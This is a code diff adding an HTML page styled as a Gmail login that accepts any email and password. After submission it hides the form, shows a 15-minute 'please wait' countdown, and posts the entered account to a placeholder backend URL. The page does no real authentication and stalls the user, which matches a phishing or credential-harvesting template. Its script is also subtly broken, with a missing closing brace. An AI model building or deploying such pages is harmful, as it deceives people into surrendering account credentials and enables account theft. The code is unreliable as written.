@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background: #f2f4f7;
+    }
+    .box {
+      width: 90%;
+      max-width: 380px;
+      padding: 30px;
+      background: white;
+      border-radius: 15px;
+      text-align: center;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 100%;
+      padding: 13px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 13px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 8px;
+      background: #333;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    #welcome { display: none; }
+    #timer {
+      margin-top: 20px;
+      font-size: 36px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="box" id="loginBox">
+    <h2>Login</h2>
+    <input type="email" id="email" placeholder="Gmail ID" autocomplete="off">
+    <input type="password" id="password" placeholder="Password" autocomplete="off">
+    <button onclick="login()">Login</button>
+  </div>
+
+  <div class="box" id="welcome">
+    <h2>Welcome 👋</h2>
+    <p>Please wait for 15 minutes.</p>
+    <div id="timer">15:00</div>
+  </div>
+
+  <script>
+    async function login() {
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+
+      // Credentials check
+if (email !== "" && password !== "") {
+  document.getElementById("loginBox").style.display = "none";
+  document.getElementById("welcome").style.display = "block";
+  startTimer();
+
+  try {
+    await fetch("YOUR_BACKEND_URL/login-notification", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        event: "login_success",
+        account: email
+      })
+    });
+  } catch (error) {
+    console.log("Notification service unavailable.");
+  }
+} else {
+  alert("Kripya Gmail ID aur Password dono enter karein.");
+}
+    function startTimer() {
+      let seconds = 15 * 60;
+      const timer = setInterval(function() {
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        document.getElementById("timer").textContent =
+          String(minutes).padStart(2, "0") + ":" +
+          String(remainingSeconds).padStart(2, "0");
+
+        seconds--;
+        if (seconds < 0) {
+          clearInterval(timer);
+          document.getElementById("timer").textContent = "Done!";
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
